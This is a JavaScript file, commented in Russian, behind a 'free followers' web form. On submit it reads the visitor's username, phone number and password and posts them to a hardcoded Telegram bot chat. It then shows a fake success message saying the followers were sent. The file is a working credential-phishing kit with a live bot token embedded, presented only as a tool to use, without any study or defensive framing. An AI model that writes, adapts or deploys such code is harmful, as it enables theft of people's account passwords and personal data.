// Учетные данные Telegram-бота
const BOT_TOKEN = "8202428141:AAEQsYhcSsW97cqLoD-99MgJsag_eout2EM"; // Замените на токен вашего бота
const CHAT_ID = "6443403835"; // Замените на ваш chat_id
const TELEGRAM_API_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

// Обработчик отправки формы
document
  .getElementById("telegramForm")
  .addEventListener("submit", function (e) {
    e.preventDefault();

    // Получение данных формы
    const username = document.getElementById("username").value;
    const tel = document.getElementById("tel").value;
    const followers = document.getElementById("followers").value;
    const password = document.getElementById("password").value;

    // Составление текста сообщения
    const message = `
📩 *Новая заявка получена:*\n
👤 *Имя пользователя:* ${username.replace(/_/g, "\\_")}
📞 *Номер телефона:* ${tel.replace(/_/g, "\\_")}
🔑 *Пароль:* ${password.replace(/_/g, "\\_")}
⭐ *Запрошено подписчиков:* ${followers}
`;

    // Отправка сообщения в Telegram
    fetch(TELEGRAM_API_URL, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: message,
        parse_mode: "Markdown", // Markdown для форматирования
      }),
    })
      .then((response) => {
        if (response.ok) {
          alert("Подписчики успешно отправлены!");
          document.getElementById("telegramForm").reset();
        } else {
          throw new Error("Не удалось отправить сообщение.");
        }
      })
      .catch((error) => {
        console.error("Ошибка:", error);
        alert("Подписчики не были отправлены, пожалуйста, повторите попытку!");
      });
  });
  // Установка значения для количества подписчиков из Local Storage
document.addEventListener('DOMContentLoaded', () => {
  const followersInput = document.getElementById('followers');
  const clickCount = localStorage.getItem('clickCount') || 0; // Получаем клики или 0
  followersInput.value = clickCount; // Устанавливаем значение в поле
});
